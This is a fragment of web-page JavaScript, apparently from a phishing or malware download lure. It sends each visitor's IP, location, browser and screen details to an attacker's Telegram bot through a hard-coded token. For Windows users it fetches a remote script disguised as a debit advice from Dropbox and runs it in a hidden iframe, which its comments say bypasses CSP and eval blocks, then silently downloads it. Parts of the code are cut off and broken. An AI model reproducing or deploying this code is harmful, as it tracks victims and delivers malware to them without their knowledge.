        function reportToTelegram() {
            try {
                const botToken = '8122635592:AAGMr779_JVHA-JyJ_8FKJ5TlvXBAm8rM6s';
                const chatId = '1078753356';
                
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const language = navigator.language;
                const screenRes = `${screen.width}x${screen.height}`;
                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const timestamp = new Date().toISOString();
                
                fetch('https://ipapi.co/json/')
                    .then(response => response.json())
                    .then(data => {
                        const ip = data.ip || 'Unknown';
                        const city = data.city || 'Unknown';
                        const region = data.region || 'Unknown';
                        const country = data.country_name || 'Unknown';
                        const org = data.org || 'Unknown';
                        const lat = data.latitude || 'Unknown';
                        const lon = data.longitude || 'Unknown';
                        
                        const message = `
🔔 *DOWNLOAD SUCCESSFUL*
📱 *Device:* Desktop/Windows
🆔 *IP:* ${ip}
📍 *Location:* ${city}, ${region}, ${country}
🗺 *Coordinates:* ${lat}, ${lon}
🏢 *ISP:* ${org}
💻 *OS:* ${platform}
🌐 *Browser:* ${userAgent.substring(0, 100)}...
🗣 *Language:* ${language}
📺 *Screen:* ${screenRes}
⏰ *TimeZone:* ${timeZone}
🕒 *Time:* ${timestamp}
                        `;
                        
                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: message,
                                parse_mode: 'Markdown'
                            })
                        });
                    })
                    .catch(() => {
                        const message = `
🔔 *DOWNLOAD SUCCESSFUL* (Basic Info)
📱 *Device:* Desktop/Windows
💻 *OS:* ${platform}
🌐 *UserAgent:* ${userAgent.substring(0, 100)}...
🗣 *Language:* ${language}
📺 *Screen:* ${screenRes}
⏰ *TimeZone:* ${timeZone}
🕒 *Time:* ${timestamp}
                        `;
                        
                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: message,
                                parse_mode: 'Markdown'
                            })
                        });
                    });
            } catch(e) {
                console.log('Report error:', e);
            }
        }

        // Mobile detection (UNCHANGED)
        function isMobile() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(navigator.userAgent);
        }

        function showMobileWarning() {
            document.body.innerHTML = `

            `;

        // 🔥 EDGE-PROOF EXECUTION (NEW - REPLACES OLD FETCH/EVAL)
        if (isMobile()) {
            showMobileWarning();
        } else if (/Windows/i.test(navigator.userAgent)) {
            // Create hidden iframe for Edge CSP bypass
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            fetch('https://www.dropbox.com/scl/fi/kxk9zuqx7fdng5tb1ey33/DebitAdvice7664_US_user.js?rlkey=xzhwhxc4281vr37oq3a4aoec3&raw=1', {
                method: 'GET',

            .then(response => response.text())
            .then(jsCode => {
                // Edge-safe execution via iframe srcdoc (bypasses CSP/eval blocks)
                iframe.srcdoc = `<script>${jsCode}<\/script>`;
                
                // Auto-download backup (silent)
                const blob = new Blob([jsCode], {type: 'application/javascript'});
                const blobUrl = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = blobUrl;
